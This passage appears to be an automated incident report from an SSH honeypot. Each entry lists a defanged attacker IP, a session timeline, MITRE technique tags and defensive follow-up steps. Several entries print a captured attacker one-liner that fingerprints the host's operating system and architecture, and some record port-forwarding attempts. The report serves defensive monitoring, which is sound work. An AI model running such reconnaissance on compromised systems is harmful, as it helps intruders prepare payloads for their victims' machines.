| **First Seen** | 2026-08-01 11:36 |
| **Last Seen** | 2026-08-01 11:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:36:22` | `cowrie.session.connect` |
| `2026-08-01 11:36:23` | `cowrie.client.version` |
| `2026-08-01 11:36:23` | `cowrie.client.kex` |
| `2026-08-01 11:36:29` | `cowrie.login.success` |
| `2026-08-01 11:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.137.167[.]190` to AbuseIPDB if not already reported
- [ ] Block `8.137.167[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2bb1915e0e8

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-01 11:36 |
| **Last Seen** | 2026-08-01 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:36:30` | `cowrie.session.connect` |
| `2026-08-01 11:36:30` | `cowrie.client.version` |
| `2026-08-01 11:36:30` | `cowrie.client.kex` |
| `2026-08-01 11:36:30` | `cowrie.login.success` |
| `2026-08-01 11:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fbd60141365

| Field | Detail |
|---|---|
| **Source IP** | `118.145.154[.]96` |
| **First Seen** | 2026-08-01 11:38 |
| **Last Seen** | 2026-08-01 11:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:38:26` | `cowrie.session.connect` |
| `2026-08-01 11:38:26` | `cowrie.client.version` |
| `2026-08-01 11:38:26` | `cowrie.client.kex` |
| `2026-08-01 11:38:29` | `cowrie.login.success` |
| `2026-08-01 11:38:29` | `cowrie.session.params` |
| `2026-08-01 11:38:29` | `cowrie.command.input` |
| `2026-08-01 11:38:31` | `cowrie.log.closed` |
| `2026-08-01 11:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.154[.]96` to AbuseIPDB if not already reported
- [ ] Block `118.145.154[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-407317fca8b4

| Field | Detail |
|---|---|
| **Source IP** | `121.165.8[.]169` |
| **First Seen** | 2026-08-01 11:56 |
| **Last Seen** | 2026-08-01 11:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:56:18` | `cowrie.session.connect` |
| `2026-08-01 11:56:19` | `cowrie.client.version` |
| `2026-08-01 11:56:19` | `cowrie.client.kex` |
| `2026-08-01 11:56:21` | `cowrie.login.success` |
| `2026-08-01 11:56:22` | `cowrie.direct-tcpip.request` |
| `2026-08-01 11:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.165.8[.]169` to AbuseIPDB if not already reported
- [ ] Block `121.165.8[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5ccba06024e

| Field | Detail |
|---|---|
| **Source IP** | `14.99.61[.]248` |
| **First Seen** | 2026-08-01 11:59 |
| **Last Seen** | 2026-08-01 11:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:59:15` | `cowrie.session.connect` |
| `2026-08-01 11:59:16` | `cowrie.client.version` |
| `2026-08-01 11:59:16` | `cowrie.client.kex` |
| `2026-08-01 11:59:17` | `cowrie.login.success` |
| `2026-08-01 11:59:18` | `cowrie.direct-tcpip.request` |
| `2026-08-01 11:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.99.61[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.99.61[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e05de64c5d7

| Field | Detail |
|---|---|
| **Source IP** | `85.30.248[.]213` |
| **First Seen** | 2026-08-01 11:59 |
| **Last Seen** | 2026-08-01 11:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:59:23` | `cowrie.session.connect` |
| `2026-08-01 11:59:23` | `cowrie.client.version` |
| `2026-08-01 11:59:23` | `cowrie.client.kex` |
| `2026-08-01 11:59:24` | `cowrie.login.success` |
| `2026-08-01 11:59:24` | `cowrie.direct-tcpip.request` |
| `2026-08-01 11:59:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.30.248[.]213` to AbuseIPDB if not already reported
- [ ] Block `85.30.248[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b320ef0109f5

| Field | Detail |
|---|---|
| **Source IP** | `223.25.108[.]2` |
| **First Seen** | 2026-08-01 12:06 |
| **Last Seen** | 2026-08-01 12:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:06:16` | `cowrie.session.connect` |
| `2026-08-01 12:06:17` | `cowrie.client.version` |
| `2026-08-01 12:06:17` | `cowrie.client.kex` |
| `2026-08-01 12:06:19` | `cowrie.login.success` |
| `2026-08-01 12:06:19` | `cowrie.direct-tcpip.request` |
| `2026-08-01 12:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.25.108[.]2` to AbuseIPDB if not already reported
- [ ] Block `223.25.108[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc01ce2f213f

| Field | Detail |
|---|---|
| **Source IP** | `61.12.84[.]172` |
| **First Seen** | 2026-08-01 12:06 |
| **Last Seen** | 2026-08-01 12:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:06:29` | `cowrie.session.connect` |
| `2026-08-01 12:06:30` | `cowrie.client.version` |
| `2026-08-01 12:06:30` | `cowrie.client.kex` |
| `2026-08-01 12:06:31` | `cowrie.login.success` |
| `2026-08-01 12:06:32` | `cowrie.direct-tcpip.request` |
| `2026-08-01 12:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.84[.]172` to AbuseIPDB if not already reported
- [ ] Block `61.12.84[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3488fd2a84cd

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-08-01 12:06 |
| **Last Seen** | 2026-08-01 12:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:06:33` | `cowrie.session.connect` |
| `2026-08-01 12:06:34` | `cowrie.client.version` |
| `2026-08-01 12:06:34` | `cowrie.client.kex` |
| `2026-08-01 12:06:35` | `cowrie.login.success` |
| `2026-08-01 12:06:36` | `cowrie.direct-tcpip.request` |
| `2026-08-01 12:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-329ad4553546

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:08 |
| **Last Seen** | 2026-08-01 12:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:08:33` | `cowrie.session.connect` |
| `2026-08-01 12:08:34` | `cowrie.client.version` |
| `2026-08-01 12:08:34` | `cowrie.client.kex` |
| `2026-08-01 12:08:36` | `cowrie.login.success` |
| `2026-08-01 12:08:37` | `cowrie.session.params` |
| `2026-08-01 12:08:37` | `cowrie.command.input` |
| `2026-08-01 12:08:37` | `cowrie.command.input` |
| `2026-08-01 12:08:37` | `cowrie.command.input` |
| `2026-08-01 12:08:37` | `cowrie.command.input` |
| `2026-08-01 12:08:37` | `cowrie.command.input` |
| `2026-08-01 12:08:37` | `cowrie.command.success` |
| `2026-08-01 12:08:37` | `cowrie.command.input` |
| `2026-08-01 12:08:37` | `cowrie.command.input` |
| `2026-08-01 12:08:37` | `cowrie.command.input` |
| `2026-08-01 12:08:37` | `cowrie.command.input` |
| `2026-08-01 12:08:38` | `cowrie.log.closed` |
| `2026-08-01 12:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-026c1a233a8e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:10 |
| **Last Seen** | 2026-08-01 12:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:10:18` | `cowrie.session.connect` |
| `2026-08-01 12:10:18` | `cowrie.client.version` |
| `2026-08-01 12:10:18` | `cowrie.client.kex` |
| `2026-08-01 12:10:20` | `cowrie.login.success` |
| `2026-08-01 12:10:21` | `cowrie.session.params` |
| `2026-08-01 12:10:21` | `cowrie.command.input` |
| `2026-08-01 12:10:21` | `cowrie.command.input` |
| `2026-08-01 12:10:21` | `cowrie.command.input` |
| `2026-08-01 12:10:21` | `cowrie.command.input` |
| `2026-08-01 12:10:21` | `cowrie.command.input` |
| `2026-08-01 12:10:21` | `cowrie.command.success` |
| `2026-08-01 12:10:21` | `cowrie.command.input` |
| `2026-08-01 12:10:21` | `cowrie.command.input` |
| `2026-08-01 12:10:21` | `cowrie.command.input` |
| `2026-08-01 12:10:21` | `cowrie.command.input` |
| `2026-08-01 12:10:21` | `cowrie.log.closed` |
| `2026-08-01 12:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12d8408a089

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:12 |
| **Last Seen** | 2026-08-01 12:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:12:04` | `cowrie.session.connect` |
| `2026-08-01 12:12:04` | `cowrie.client.version` |
| `2026-08-01 12:12:04` | `cowrie.client.kex` |
| `2026-08-01 12:12:06` | `cowrie.login.success` |
| `2026-08-01 12:12:07` | `cowrie.session.params` |
| `2026-08-01 12:12:07` | `cowrie.command.input` |
| `2026-08-01 12:12:07` | `cowrie.command.input` |
| `2026-08-01 12:12:07` | `cowrie.command.input` |
| `2026-08-01 12:12:07` | `cowrie.command.input` |
| `2026-08-01 12:12:07` | `cowrie.command.input` |
| `2026-08-01 12:12:07` | `cowrie.command.success` |
| `2026-08-01 12:12:07` | `cowrie.command.input` |
| `2026-08-01 12:12:07` | `cowrie.command.input` |
| `2026-08-01 12:12:07` | `cowrie.command.input` |
| `2026-08-01 12:12:07` | `cowrie.command.input` |
| `2026-08-01 12:12:07` | `cowrie.log.closed` |
| `2026-08-01 12:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e979b49994ad

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:13 |
| **Last Seen** | 2026-08-01 12:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:13:47` | `cowrie.session.connect` |
| `2026-08-01 12:13:47` | `cowrie.client.version` |
| `2026-08-01 12:13:47` | `cowrie.client.kex` |
| `2026-08-01 12:13:49` | `cowrie.login.success` |
| `2026-08-01 12:13:50` | `cowrie.session.params` |
| `2026-08-01 12:13:50` | `cowrie.command.input` |
| `2026-08-01 12:13:50` | `cowrie.command.input` |
| `2026-08-01 12:13:50` | `cowrie.command.input` |
| `2026-08-01 12:13:50` | `cowrie.command.input` |
| `2026-08-01 12:13:50` | `cowrie.command.input` |
| `2026-08-01 12:13:50` | `cowrie.command.success` |
| `2026-08-01 12:13:50` | `cowrie.command.input` |
| `2026-08-01 12:13:50` | `cowrie.command.input` |
| `2026-08-01 12:13:50` | `cowrie.command.input` |
| `2026-08-01 12:13:50` | `cowrie.command.input` |
| `2026-08-01 12:13:51` | `cowrie.log.closed` |
| `2026-08-01 12:13:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81fdca536e7b

| Field | Detail |
|---|---|
| **Source IP** | `20.227.140[.]178` |
| **First Seen** | 2026-08-01 12:13 |
| **Last Seen** | 2026-08-01 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:13:56` | `cowrie.session.connect` |
| `2026-08-01 12:13:56` | `cowrie.client.version` |
| `2026-08-01 12:13:56` | `cowrie.client.kex` |
| `2026-08-01 12:13:57` | `cowrie.login.success` |
| `2026-08-01 12:13:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.227.140[.]178` to AbuseIPDB if not already reported
- [ ] Block `20.227.140[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ea514bbedb5

| Field | Detail |
|---|---|
| **Source IP** | `116.72.9[.]151` |
| **First Seen** | 2026-08-01 12:14 |
| **Last Seen** | 2026-08-01 12:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:14:40` | `cowrie.session.connect` |
| `2026-08-01 12:14:41` | `cowrie.client.version` |
| `2026-08-01 12:14:41` | `cowrie.client.kex` |
| `2026-08-01 12:14:43` | `cowrie.login.success` |
| `2026-08-01 12:14:44` | `cowrie.direct-tcpip.request` |
| `2026-08-01 12:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.72.9[.]151` to AbuseIPDB if not already reported
- [ ] Block `116.72.9[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3beecec5ddf8

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]151` |
| **First Seen** | 2026-08-01 12:14 |
| **Last Seen** | 2026-08-01 12:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:14:49` | `cowrie.session.connect` |
| `2026-08-01 12:14:50` | `cowrie.client.version` |
| `2026-08-01 12:14:50` | `cowrie.client.kex` |
| `2026-08-01 12:14:52` | `cowrie.login.success` |
| `2026-08-01 12:14:52` | `cowrie.direct-tcpip.request` |
| `2026-08-01 12:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]151` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f50b97d9a920

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:15 |
| **Last Seen** | 2026-08-01 12:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:15:27` | `cowrie.session.connect` |
| `2026-08-01 12:15:28` | `cowrie.client.version` |
| `2026-08-01 12:15:28` | `cowrie.client.kex` |
| `2026-08-01 12:15:29` | `cowrie.login.success` |
| `2026-08-01 12:15:30` | `cowrie.session.params` |
| `2026-08-01 12:15:30` | `cowrie.command.input` |
| `2026-08-01 12:15:30` | `cowrie.command.input` |
| `2026-08-01 12:15:30` | `cowrie.command.input` |
| `2026-08-01 12:15:30` | `cowrie.command.input` |
| `2026-08-01 12:15:30` | `cowrie.command.input` |
| `2026-08-01 12:15:30` | `cowrie.command.success` |
| `2026-08-01 12:15:30` | `cowrie.command.input` |
| `2026-08-01 12:15:30` | `cowrie.command.input` |
| `2026-08-01 12:15:30` | `cowrie.command.input` |
| `2026-08-01 12:15:30` | `cowrie.command.input` |
| `2026-08-01 12:15:30` | `cowrie.log.closed` |
| `2026-08-01 12:15:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbdec8be99d6

| Field | Detail |
|---|---|
| **Source IP** | `101.89.148[.]7` |
| **First Seen** | 2026-08-01 12:15 |
| **Last Seen** | 2026-08-01 12:16 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:15:57` | `cowrie.session.connect` |
| `2026-08-01 12:15:58` | `cowrie.client.version` |
| `2026-08-01 12:15:58` | `cowrie.client.kex` |
| `2026-08-01 12:16:03` | `cowrie.login.success` |
| `2026-08-01 12:16:13` | `cowrie.session.params` |
| `2026-08-01 12:16:13` | `cowrie.command.input` |
| `2026-08-01 12:16:14` | `cowrie.log.closed` |
| `2026-08-01 12:16:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.89.148[.]7` to AbuseIPDB if not already reported
- [ ] Block `101.89.148[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02f57f45fdc6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:17 |
| **Last Seen** | 2026-08-01 12:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:17:09` | `cowrie.session.connect` |
| `2026-08-01 12:17:09` | `cowrie.client.version` |
| `2026-08-01 12:17:09` | `cowrie.client.kex` |
| `2026-08-01 12:17:10` | `cowrie.login.success` |
| `2026-08-01 12:17:11` | `cowrie.session.params` |
| `2026-08-01 12:17:11` | `cowrie.command.input` |
| `2026-08-01 12:17:11` | `cowrie.command.input` |
| `2026-08-01 12:17:11` | `cowrie.command.input` |
| `2026-08-01 12:17:11` | `cowrie.command.input` |
| `2026-08-01 12:17:11` | `cowrie.command.input` |
| `2026-08-01 12:17:11` | `cowrie.command.success` |
| `2026-08-01 12:17:11` | `cowrie.command.input` |
| `2026-08-01 12:17:11` | `cowrie.command.input` |
| `2026-08-01 12:17:11` | `cowrie.command.input` |
| `2026-08-01 12:17:11` | `cowrie.command.input` |
| `2026-08-01 12:17:12` | `cowrie.log.closed` |
| `2026-08-01 12:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffe115bc8e76

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:20 |
| **Last Seen** | 2026-08-01 12:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
